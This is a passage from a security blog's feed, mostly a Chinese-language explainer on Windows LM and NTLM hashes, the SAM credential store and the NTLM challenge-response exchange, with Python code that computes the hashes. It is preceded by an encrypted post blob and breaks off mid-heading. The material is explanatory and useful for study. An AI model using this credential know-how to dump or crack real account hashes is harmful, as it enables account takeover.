386cf55d0caca1ebbd0dfc5e1982f94cc29b050f36ae47f5991b4699cb85fc58a7dc0437bd919644a8a6f85e1b77e557c68a28486959e0a7149562ef2a62cd1a8b49c65a23675222ca8278791001e4aa70362935e30e328a7465c47230ebadad5e7e50065bc9396bffc7e501028c7bfe12eeae9995785d1dd7d581f8d1ff5a3759a805eae79396389edf4d4b50456442c87c8d594644822592101660108cf841955771202b5990754aada9ee2fae0d52b707993ceb3ee47cead135636e23447c78aa9931ba4dafa0f1d4dde3922094ea5acc71ca7ba6cf4e387ba105ec24e413426640c45374140463cb256290b1693a1cddf558a86d560c49aaae309bd1b4f6cc337aeca51ba11b32f56f17252bae256940d535f0f3aba29c64153faa8b4e400cd5d14932616660a024de6bfcd84f8a577a84b984d478a2db92a3b9c6d5fb38c465e6062e96f2b6681cd97a3a1dac52fccde9cda5d3bbcb3d93263dac0eb23c618d95e2bbfd6c6fac51c366c860c5db428de6eb3d7b6040cd60f00003978d5a742be910ca0fd688d12219433da150b1e6f10229ad15c93bf110fb5846f0a5bf58131c7413581dc828a8316319371de391f4a119834ddeb50c73b47422994950c0b86ca43ae180ba8859f1133efac92f7e370fa325fbcd4e1a7601d7c4857f18da6dc952828a371bcd9c780ed5aae7943a289f10e39df385b53299fafd03e775a60e4fd5c88b919e8aadc0b4051fc16682e99c1ddf322b7a653ea829c55919da145a6a6d75b5b7daf046a17746883582f1c356fe231c9df389697221258aedbc2bf4472313fe429e513e287e3f30536e427ad3f3438b03577850775074aabdf8bc1cfee305b803aad51c1a464817631dfc29bca15ffb5ded02d2bc9519090520988ca5ecd45bf8350f4c86e2cbaf66703431be0166d76c3ed5ce0c9d9886c00d6c829e54274d48fe2cd7225966ec4d7e756b749f8e37b60025678e1025abc0374581027c18254a0e3cf0ca3b56ce671b3a6597c5766920a045217c5ffabc4063fba2c0dd77c3a73c25ea7471fdc190dc15219ea3ee85bffaf3cbcdae043ab48e4326bd01ddc329bf71a2dbe6497a08d9bdb0925f95ea727b37ea3fe5e9c5e8f9bea0dffa1f09d8d324933c13535ea72f3d625b56da103917eb4d5f1b1fa492069b73205162e4c085664e1a2be97d6d2a15508526ad46b12fee3126454f1c9f18f52b262ee99f43c5c95f7a395c788fe28b57ad0a2bdbb6e0ff38987233abcdea766a7089989a8b9389f863b7df6bbdab33f3f3dc84587b8d808f577d113edb5c2780e5f28f2c4aefb0985d18bbbf37e216b5b04305eab830a4a76d103264a41e6819bb2017fa8b8b6425218e4d0a958d86c118a56b61d4e0456ea6f4a6c3255653945eb17dde79cda511dfae17f2a3ec03206fa653769eda7e845d5bfb6449e64e7af9a1964922203558ea4dde82310d70e46c32b6fe28a4beef46e370ef79961f077095a417f4eb5fa9e721b764ac4c44ba41f56d49a711c2917bf6cb7cd869d60dc659da897855c9f116d690d164f1754b16c3cb226f95d70cb9475f7481fc0f702448da9c21a33b8da9014c4422416abf05bc0b6ae75bfa6e72a8fab482bde4e91c4169cf33256f7c14a58bbd567ecbe2017af4f66e981f241887047ecbca32af626229bcc072a06065b595c5d06163fee0a1fa41ae04737fd06ed3d7789b76ac21acca6d26a8d2d7fc238a7feec46ef3ed9a68b34d8c84eb2bc7791e27375b046d8a4d3859a2f6b81a48958583a757a991361389d57b0c9f51a012ced5dfbe1145deb9af25027eeac40e3beac5bdeca50b1128fa86600aa6743ae3ac4daad58c94f9042e6904d4b63275d4c3bf1480b254a4fb99ce6c47de0992f3475953e4b5c2ba6662beda067601e2ca5c76c90ee28a7540f9d131337a20cb36507df8008d957dce1407a47e1e3c89d9afbaa8ed6e0945edf1f5a332ad8ed6b171b380c94bbdd4b1ca85f1fac6ae14f490966714845293f0ecbdc9cb9c1c578d6b599267af2c4119877eb24c8785ee2c47df286d71bdfc3e5deb3d335f59c675c336013b46a1ebf1e73fb111caa612d1ec39fde1f4964d89b6dd43cb0c1001ce6e54bf17b95f137bfd37a0bda339e6f7c0b60ac7e034e3ceb4bd79638db47bf3c7a4beda48d6f195b046db027877ec38b1d3b3105ccc714d5464ab39fd8e8e9e38f2f1ffb70ad6906a9231fdb3828356727b755acb513c1f72c0292a53c961af01104e37a4d56efe99822dc0ca34d3cf4de71f649fbf936c30e3466221ca59d459f07bdb276781c30cfe08bac1ea9d9d9c3eb3d1aa1335484d6b6f60860ed9fff18cecf4a1bb6a2cc1ba2ce27bcef78e240486b700806a2348fc94c6e79d861b8ac2741d3aea0b4c7c689d23b7e6fceeb6e094762e36a671c261dfa480690829006b0cf21a350947b7be282da6a64b2556e1901d0e74de2567552e01eb1bd4038b2e76a1b2a112031ab9a91fd8defff407f2fd880b041e2d938e365d1913fdc61d1a884e24e7483aa3af93d17821b173ecf3e3085e0d7c01a0983d6a55b38da24cc091ffc49918fca0208e44c5848987f92d8a2522d31cc83260cfa1500f55cffcddaff93624db4f72aa1b56342815e98d70dc2a886e67c124bf666a46eae0fdd479d9cec9f47972715bf8295c038ca8bba84c3bb82b9323d09084dc86fc4755bc241e586008910b645af4e59d5b65938afcbe3a562f2bc97b5da4af364654ac5c45a7d598896bbd6622f63e02daae6d460635250af7982bbfac22ea2a4f5191b59114f22fa2d55d7f8ceb070bdde9c70b9cd9bbd3cc81672631afbfe0e53cdd685e22fea6647f5a2d7916052ecf1b79d850568d7b21621db0edf76500f32b82e36dff034081d9a002e1caf560579981476644ffffbc349ad34f75a0d7ba9674a76a72aa033105384e1713d9f68f2051da32317751e7952d8a9bd92068245e3d3247fcde40d559488eb341ce45246031c3c992137684c32aac266a16a8a3139c5b28c242f99971afcabb5f30cc2cddc9427a2a51495d4b4fe136495153d4f044c9b1a7247ae807e00611c971250970b5dd52f2a9cf75e85edd2a114e772068d995b0beab46ffc0ad19022fcd29d42ca165c73848d4f4baa13d54504724f7e9782aed14aebe9b4044eb6de2b2e9b503a76bc6dabd42d72e64ce074ffb9b47434a149e466c0bfd6f0b53ef9d3dbbd1de43e9e69134d093861ddd395bcecb066ea721aca69e31f96ca7e4ba72391d1b6f3eb966226dd5b74f23e7c66004f7dce13045e1f3a5638d727f7ab3890ff5154b0e800571a921398a28e8ec945fde802fdb82b6e20ff35c544b4758cd9092ead813adce0c6ac692ff13dc490c6beb91d71e8e648c076c53bbec55b802e6e18fb25346c78d2c6736c8826a64743a4d17a8ed875f4bd42d8a7a2091c7edaf382eed762f08a35661c1df551864d290d2557aeb37e2cdf24cf3634f5a82f1cf513ece00ee0bd23698ce771469096d9944c02ce5c2fe06f42ac42fdc40f037b809e6d395018d3dc8eaf7f86ed9fc029c396f599917544b1106b4f882042273673cd87b7fce6e4ee967e9ce6c603df09d2532b49a5a91de459fd1d783139d46a7707379c734486978bccc59590a663ca23338f8018d1845f532dcbc2b1786ae02adda9b510b11c5cee552a488c11d50427b5b808283c086a34e8db2765e6575a725172bd5224838e1ea6a9c571b2b8717757af7ae902f8e8cd31c3cc1af1366fb292a9603958db85d382b4be13ae1fed6e56af9486aa1f378a1d8b84bf4b789233d80db9cc7a58dce5cf4a14a7ebc823be285648f0bd74ab6f6b6d2f4de41ad2b5a896bb7a2b638f0f69efb1b36ab1de7b5a5e304d970c8e8e26e5ba627d17444243654c51f8fa3e6ea9163c5d45a8f3f99db789b332491b13c99175cdc5740ad7b33b753023afa14ca55e4975fdffa68ccdc3e2c7ea4ac7b7e6848f994e44c72b57482221fbaf90e5a482169ff4527610c6704af8f91810cc6b71dff3dda5450c66ce61a7cfaea60ce30a265f789217d2a347e1634ab5ddfdf6d204a7988e667f058d968e8156e689378796444d8c1ab68ec6fd46620b2923b607b95a410973c95f2a233d1fec88a431e9ddffd33b1ad5812f029a4f27df7e3524886999718fa5c9961a5b7763b4e61446285d23d7d7fb6974068c00555853877f88167b1124d93e3fe2c254782b75779a66aff6d299c885ac7973ba7c4ff93f49d4a09108a0c358c4a5ea6c9db1043a92cfe741e643913c7ea9bf28eb625b810557162b6f2dff6e23ec74fff1eb81799dd80bc53f9fc18e103eec3f00cdab21883b7bbfd128904d16570120715671e61ee2deeda930452426be57af8c5b5c21605d19bd09585456c36d65972295c3e572338234b6f80df79d1124ce1b7a17693173a42d124596780110a7862478a7b9d473763d040fcc2e7b753f60f2747de8d966f83e96b5859eddec0664efe0e6af260054024e1c5642184ef2e271718bd342b087ca546dd351089ca3b8ea7880484c95115f571a52398989a971aa505d3bace24c89f59469e70d1a7a012dd21966f8a191ab7653e212c422fc1dc0b14a8c71329372c23030164f09c243810ab08620552aeec25314ba1f28f5eb9f21aac7a592b19c125dd8ecba9fe7ae0879b044ea1131c54fe3d581eefc13de67d4685164df1a25f67789175b6b645ff13a3187d1fd5e60e8cd1bc9d9102901830beccaefd26b5082a3a5e4f0ab8dac024843c0e5164f984e19da9adc391623fa66d81e829e3cc4bd49d19e2986a157ed6f96c6bec33d38ef2491f09c9d8c41f2ca205303a6d18290ec52a24d88cf142a6745bde09b70a3b7b99981e8d74bc7fee58e2f3177710421e67ac3ae5552692d62541792586d7a21ddc40986f2331bbe58f174388df02c825ebc2f69069868342577d4335644491b51494028c8a60b117e4f286d8d69a828a9e9caf62558da0c13cb121539c4fbaf27c607ae52f06d4b7c2f64e12ffbeae9a376dad132cb024a1da63c62ca5592b7930c22c12ed76784aac65a539a8d68691bb8017a817ff0d5cdd007131c389e40dea43ad4304748c5bbf6f60e48f6e0fc9d6d1e5aa6ed5f6e91f3f7dd40dd72891a3a8cdcc110a5fe05dcb7c4de68dfea212f35961d812ba381bddc1fb4cf3c074ee175c012a3869f829a7ec2bcb135b15b25c23870cc42e8c57a6330d2a1b4e58670dd4d4f6fd57a37e917bc4a10687f28d4e448217b23a019a992e2f5b1005d971ad46a96981cd9fb51ab15494ccbc595da945d8807bcbb98986a0f3c4ab699fed151b98dd894a297e7ce3c850fcf5fe1be7797d98165440b1efa7b41a0df098722bba67d59164f5da5778f2c2fc6e4b0f245cadcecba9676e0160253d82759bb33306900a4737fe5b30e4bfb619e95f25de46745419ae3f03561f82404f1805fb15f0558a801a32e079d30aceeb0e3335a80ab62d5ccbf37efb6c83dfef12d5c7f6605eec2ab8fbf021fe8b7ed79a1e7171ed9a5c871df5b31a26ecac19d179d5140b4ea52b9b6ce5c4e9828cc84e92f77ef463d64c691cd365d27f6f977bb3334b93b81a17aef5b550455f907088e91777716cf20d80a8078348fd7d66ec226b691d157a34a72652a56766e8d278745783c930f82bd3a4e02ba89aa4ecbdf4619d9f4c741f8a7e556ce8979018d1ff810a82f1a48433e9931f2e9e17c9067fa9863a90cec2088bf6be776280b4c809b7dbf46b4e8e17a0e7278de6c4548a1d0f417ffa7f703de02b3b068874ca25ad25366d1525282c3e7342252bad299b0bc6e5fa30f4aeaf232f5ee83f17aa60896d44e1820e7d50b29eb004ed2ed580a7ac17dd01fc66a83d775d432c7eff596831e09a8d81fcdd4193212183c4d3a42fccfca0469b13dd2ca5f395777f28ce9486c0ec41a67820ee16c53f223e9f47feb50f874510de43ca6ebac11962899e52829bc04b8eb1f64d6bddc33c97fa92465e30ab182608fe03f617733d40d2d40125c561ba3f5e5fc3070e868b1fd2d6b48f6868662836185b008a5876eeec3b451003a1e2055fecda4e3d88eb57b0c9a5aa294fec8162740b2f012705e0992a7c576a09a37f13579bdc2fb9b65fde58b3bcceafee1e070b7b6495f5b611702b901168e7f987a9fae8edcad322e3d31f032b92f70d87892b8cddb1f83070be57df65a84214225d7807d734f480a87560bc356859e4ab4d9a6a71819e46c81a7be4701181787e1cc32515b2a3cad74a99cd9e237ac815cd2f11eabdfd4c042acd5134cb20b3d443711c4819109b58a1ec6da3caf8d298458b1d95448c4a435bbe1837d03c4ce6265127095c3b9c4a63eb8cf37dcf06010f19d38ec30b7f3d108bcffad6b89b3589d7fc809e45e3f73b576cce07dcb90392662320da0199b4993e505dcdded3f04d76b558dfa3aeeb15014f63e33c3c20349abd58b5292cc9f183a0d60f86ad94f10de8181cdf7b117d247cb5b4835e60297fe8707317752f0ea0aaef295388324c1f8c739acce2d92771a49c572d8939dd2bc057372f5c0eecc349c1e8b2bdb0f4fbacf93e1181ba19fb55db05a6945eed66efa74103fad913e52f459be9fe756aabe66b8dcb3c974bed3bc596137e2ceb486977abcc18957b3e32a2c0aa8cb89e97a99cf33c734227575c55aaf6f1384c4cc68fdb4cf450ad7830fef8b5cf79eb71a209c175f56ea9a648361fb164e08ee2c4aa400ba5ba7f3fec9ca637dff287154704c6e0f6c2eb80389a75fd16ad9b6a338120f8156f125bf9b51e5518895b7b3195973c56cb79f61b510d81fd0882ca3da79f2828834a7225f5f7aec355172a3c6b16572d865c3f83a58d6882c42914e7192</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">坟墓里寂静无比，埋葬你的是所有你没说出口的话</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">坟墓里寂静无比，埋葬你的是所有你没说出口的话</summary>
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="内网" scheme="https://ghostasky.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>NTLM认证</title>
    <link href="https://ghostasky.github.io/2022/05/23/NTML/"/>
    <id>https://ghostasky.github.io/2022/05/23/NTML/</id>
    <published>2022-05-22T16:00:00.000Z</published>
    <updated>2022-07-12T06:27:09.786Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>NTLM的东西在github之前写过，但是不够详细，这里重新再过一遍。</p><p>NTLM使用在Windows的工作组环境中，而kerberos则使用在域的情况下。</p><h1 id="LM-hash-amp-NTLM-hash"><a href="#LM-hash-amp-NTLM-hash" class="headerlink" title="LM hash &amp; NTLM hash"></a>LM hash &amp; NTLM hash</h1><p>在写NTLM认证之前先写下LM和NTLM。</p><p>hash密码格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">用户名:SID:LM-Hash:NTML-Hash:::</span><br></pre></td></tr></table></figure><h2 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h2><p>全称LAN Manager Hash, windows最早使用的加密算法。</p><p>LM Hash计算步骤：</p><ol><li>密码全部转换为大写，转换为16进制，14字节，不足用0补全。</li><li>分成两个7字节，每部分为56bit</li><li>每7bit分组，在后面加一个0bit，即每组8bit</li><li>上述两组，使用DES分别加密，key为：<code>KGS!@#$%</code></li><li>完成后，两组拼接，得到LM Hash</li></ol><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span></span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">group_just</span>(<span class="params">length,text</span>):</span></span><br><span class="line">    <span class="comment"># text 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    text_area = re.findall(<span class="string">r&#x27;.&#123;%d&#125;&#x27;</span> % <span class="built_in">int</span>(length), text) <span class="comment"># [&#x27;0011000&#x27;, &#x27;1001100&#x27;, &#x27;1000110&#x27;, &#x27;0110011&#x27;, &#x27;0100001&#x27;, &#x27;1010100&#x27;, &#x27;1101100&#x27;, &#x27;0000000&#x27;]</span></span><br><span class="line">    text_area_padding = [i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> text_area] <span class="comment">#[&#x27;00110000&#x27;, &#x27;10011000&#x27;, &#x27;10001100&#x27;, &#x27;01100110&#x27;, &#x27;01000010&#x27;, &#x27;10101000&#x27;, &#x27;11011000&#x27;, &#x27;00000000&#x27;]</span></span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(text_area_padding) <span class="comment"># 0011000010011000100011000110011001000010101010001101100000000000</span></span><br><span class="line">    hex_int = <span class="built_in">hex</span>(<span class="built_in">int</span>(hex_str, <span class="number">2</span>))[<span class="number">2</span>:].rstrip(<span class="string">&quot;L&quot;</span>) <span class="comment">#30988c6642a8d800</span></span><br><span class="line">    <span class="keyword">if</span> hex_int == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        hex_int = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex_int</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lm_hash</span>(<span class="params">password</span>):</span></span><br><span class="line">    <span class="comment"># 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span></span><br><span class="line">    pass_hex = password.upper().encode(<span class="string">&quot;hex&quot;</span>).ljust(<span class="number">28</span>,<span class="string">&#x27;0&#x27;</span>) <span class="comment">#3132333435360000000000000000</span></span><br><span class="line">    <span class="built_in">print</span>(pass_hex) </span><br><span class="line">    <span class="comment"># 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    left_str = pass_hex[:<span class="number">14</span>] <span class="comment">#31323334353600</span></span><br><span class="line">    right_str = pass_hex[<span class="number">14</span>:] <span class="comment">#00000000000000</span></span><br><span class="line">    left_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(left_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    right_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(right_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    <span class="comment"># 3. 再分7bit为一组,每组末尾加0，再组成一组</span></span><br><span class="line">    left_stream = group_just(<span class="number">7</span>,left_stream) <span class="comment"># 30988c6642a8d800</span></span><br><span class="line">    right_stream = group_just(<span class="number">7</span>,right_stream) <span class="comment"># 0000000000000000</span></span><br><span class="line">    <span class="comment"># 4. 上步骤得到的二组，分别作为key 为 &quot;KGS!@#$%&quot;进行DES加密。</span></span><br><span class="line">    left_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,left_stream) <span class="comment">#44efce164ab921ca</span></span><br><span class="line">    right_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,right_stream) <span class="comment"># aad3b435b51404ee</span></span><br><span class="line">    <span class="comment"># 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span></span><br><span class="line">    <span class="keyword">return</span> left_lm + right_lm</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">hash</span> = lm_hash(<span class="string">&quot;aaaaa&quot;</span>)</span><br></pre></td></tr></table></figure><p>上述LM Hash有一些问题：</p><ol><li>密码长度不超过14字节</li><li>不区分大小写</li><li>长度小于7位的话，后半部分唯一确定:<code>aad3b435b51404ee</code></li><li>14字节转化为2*7，降低了复杂度，即7字节DES的2倍</li><li>DES强度低</li><li>key固定</li></ol><h2 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h2><p>为解决上述问题，微软在1993年的Windows NT 3.1引入NTLM Hash，下面为各Windows对LM和NTLM的支持：</p><table><thead><tr><th></th><th>2000</th><th>XP</th><th>2003</th><th>Vista</th><th>Win7</th><th>2008</th><th>Win8</th><th>2012</th></tr></thead><tbody><tr><td>LM</td><td>√</td><td>√</td><td>√</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>NTLM</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>其中，在Win 2000&#x2F;XP&#x2F;2003中，长度不超过14的话，依旧使用LM，超过的话使用NTLM。</p><p>在Vista开始，默认只存储NTLM Hash，不存LM Hash(LM Hash固定<code>AAD3B435B51404EEAAD3B435B51404EE</code>，NULL之后运算的结果)，有些工具的格式固定，需要填写LM Hash，0填充即可。LM Hash的位置依旧存在，只不过没有价值。</p><p>NTLM Hash计算步骤：</p><ol><li>转16进制</li><li>Unicode编码，就是加00</li><li>使用MD4对Unicode进行hash</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;p@Assword!123&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="NTLM身份认证"><a href="#NTLM身份认证" class="headerlink" title="NTLM身份认证"></a>NTLM身份认证</h1><p>分为本地认证和网络认证</p><h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><p>Windows在保存密码的时候，保存的不是密码的明文，而是密码的hash。</p><p>保存的位置：<code>%SystemRoot%\system32\config\sam</code></p><p>SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库</p><p><img src="/2022/05/23/NTML/image-20220523145537700.png" alt="image-20220523145537700"></p><p>当登陆的时候，系统读SAM文件中内容与输入的比较，相同则认证成功。</p><p>认证流程：<code>winlogon.exe --&gt; 用户输入 --&gt; lsass.exe（认证）</code></p><p>用户注销、重启、锁屏后，系统会让<code>winlogon.exe</code>显示登陆界面，之后用户输入，得到输入后交给lsass进程，将明文加密为NTLM后，与SAM中的内容进行比较。</p><p>lsass：用于微软Windows系统的安全机制，用于本地安全和登陆策略。</p><h2 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h2><p>上面是本地认证，下面这里来写网络认证。</p><p>NTLM是一种网络认证协议，它是基于挑战（Challenge）&#x2F;响应（Response）认证机制的一种认证模式。这个协议只支持Windows。</p><p>由三种消息组成，即三步：</p><ol><li>协商type1：协商确定协议版本，重要的是用户名</li><li>质询type2：挑战&#x2F;响应起作用的范畴，重要的是challenge，服务端生成</li><li>身份验证type3：质询完成后的验证，重要的是response，客户端生成，又称为<code>Net NTLM Hash</code>，用户NTLM Hash计算challenge的结果</li></ol><p>在工作组中完整流程：</p><ol><li><p>用户名&#x2F;密码登陆客户端</p></li><li><p>客户端将密码进行hash存储，丢弃密码明文。客户端发送协商消息type1(NEGOTIATE)，包含客户端支持和服务端请求的功能列表，请求还包含用户名、机器以及需要使用的安全服务等信息。</p></li><li><p>服务端使用type2(质询)消息进行响应，包含服务端支持和同意的功能列表。其中最重要的是服务端生成的challenge，即服务端随机生成的16位随机数。</p></li><li><p>客户端收到上述响应后，发送type3(验证)消息。用户收到上述响应后，使用用户NTLM Hash加密challenge，得到response，发送的验证消息包含[response，username，challenge]。</p><p>这里NTLM Hash计算challenge的结果在网络协议中成为<code>Net NTLM Hash</code>。</p></li><li><p>服务端拿到type3(验证)消息后，服务端使用用户的NTLM Hash加密challenge，得到response1，将其与客户端发送的response进行比较验证。</p></li></ol><p>上述是在工作组中的流程，下面是在域中的流程，前4步是一样的，只有最后一步不一样，分为两步：</p><ol start="5"><li>服务端拿到type3(验证)消息后，服务端使用用户的NTLM Hash(如果服务端有的话)加密challenge，得到response1，将其与客户端发送的response进行比较验证。如果服务端本地没有该用户NTLM Hash的话，也就计算不了response1，这时服务端使用netlogon协议联系域控，建立好安全通道后，将type1,type2,type3一起发送给域控(这个过程也叫作Pass Through Authentication认证流程)</li><li>域控使用challenge和用户NTLM Hash计算并与response比较验证。</li></ol><h2 id="三个过程"><a href="#三个过程" class="headerlink" title="三个过程"></a>三个过程</h2><h3 id="协商type1"><a href="#协商type1" class="headerlink" title="协商type1"></a>协商type1</h3><p>每个字段的含义见微软文档：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2</a></p><table><thead><tr><th align="left">字段</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">Signature</td><td align="left">签名，一个 8 字节字符数组，必须包含 ASCII 字符串（’N’、’T’、’L’、’M’、’S’、’S’、’P’、’\0 ‘）</td></tr><tr><td align="left">MessageType</td><td align="left">消息类型，必须为0x00000001</td></tr><tr><td align="left">NegotiateFlags</td><td align="left">包含一组<strong>NEGOTIATE</strong>结构</td></tr><tr><td align="left">DomainNameFields</td><td align="left">包含域名信息字段。</td></tr><tr><td align="left">WorkstationFields</td><td align="left">包含<strong>WorkstationName</strong>信息字段</td></tr><tr><td align="left">Version</td><td align="left">版本</td></tr><tr><td align="left">Payload (variable)</td><td align="left"></td></tr></tbody></table><h3 id="质询type2"><a href="#质询type2" class="headerlink" title="质询type2"></a>质询type2</h3><p>详细字段信息见微软文档：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786</a></p><p>质询的信息重要的就是服务端产生的challenge</p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>Signature</td><td>签名，同上</td></tr><tr><td>MessageType</td><td>消息类型，必须为0x00000002</td></tr><tr><td>TargetNameFields</td><td>包含<strong>TargetName</strong>信息的字段</td></tr><tr><td>NegotiateFlags</td><td>包含一组<strong>NEGOTIATE</strong>结构</td></tr><tr><td>ServerChallenge</td><td>包含NTLM质询的8字节</td></tr><tr><td>Reserved</td><td>一个 8 字节数组，其元素在发送时必须为零，并且在接收时必须被忽略。</td></tr><tr><td>TargetInfoFields</td><td>包含<strong>TargetInfo</strong>信息的字段</td></tr><tr><td>Version</td><td>版本</td></tr><tr><td>Payload (variable)</td><td></td></tr></tbody></table><p>示例：</p><p><img src="/2022/05/23/NTML/t017f0ae4b36b11e5ae.png" alt="img"></p><h3 id="身份验证type3"><a href="#身份验证type3" class="headerlink" title="身份验证type3"></a>身份验证type3</h3><p>详细字段信息见微软文档：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce</a></p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>Signature</td><td>签名，同上</td></tr><tr><td>MessageType</td><td>消息类型，必须为0x00000003</td></tr><tr><td>LmChallengeResponseFields</td><td>包含<strong>LmChallengeResponse</strong>信息的字段</td></tr><tr><td>NtChallengeResponseFields</td><td>包含<strong>NtChallengeResponse</strong>信息的字段</td></tr><tr><td>DomainNameFields</td><td>包含<strong>DomainName</strong>信息的字段</td></tr><tr><td>UserNameFields</td><td>包含<strong>UserName</strong> 信息的字段</td></tr><tr><td>WorkstationFields</td><td>包含<strong>Workstation</strong>信息的字段</td></tr><tr><td>EncryptedRandomSessionKeyFields</td><td>包含<strong>EncryptedRandomSessionKey</strong>信息的字段</td></tr><tr><td>NegotiateFlags</td><td></td></tr><tr><td>Version</td><td></td></tr><tr><td>MIC (16 bytes)</td><td>NTLM NEGOTIATE_MESSAGE、CHALLENGE_MESSAGE 和 AUTHENTICATE_MESSAGE 的消息完整性</td></tr><tr><td>Payload (variable)</td><td></td></tr></tbody></table><h1 id="NTLM-v1-x2F-v2协议"><a href="#NTLM-v1-x2F-v2协议" class="headerlink" title="NTLM v1&#x2F;v2协议"></a>NTLM v1&#x2F;v2协议</h1><h2 